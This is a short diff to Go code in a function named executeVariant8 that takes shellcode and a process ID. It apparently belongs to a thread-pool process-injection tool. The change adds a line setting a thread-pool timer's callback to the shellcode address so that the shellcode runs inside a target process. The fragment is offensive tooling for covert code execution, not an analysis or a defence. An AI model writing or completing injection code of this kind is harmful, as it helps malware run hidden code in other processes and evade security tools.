@@ -952,6 +952,9 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	
 	// Set Pool pointer to target's TP_POOL
 	pTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
+	
+	// CRITICAL: Manually set the Callback - CreateThreadpoolTimer doesn't always set this field
+	pTimer.Work.CleanupGroupMember.Callback = shellcodeAddr
 
 	// Set timer expiration
 	pTimer.DueTime = timeout
